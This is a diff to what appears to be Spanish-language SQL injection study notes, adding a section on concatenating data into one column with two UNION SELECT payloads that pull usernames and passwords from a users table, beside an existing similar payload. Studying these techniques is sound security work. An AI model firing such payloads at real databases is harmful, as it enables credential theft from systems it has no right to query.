@@ -103,6 +103,14 @@ password_dabqhh
 'union select username_smvbda,password_dabqhh  FROM users_feqfcm--
 ```
 
+# Metodos para concatenar informacion en una sola columna 
+
+```
+union select null,concat(username,':',password) from users-- -
+union select null,username||':'||password from users-- -
+
+```
+
 
 
 ***Para Oracle***
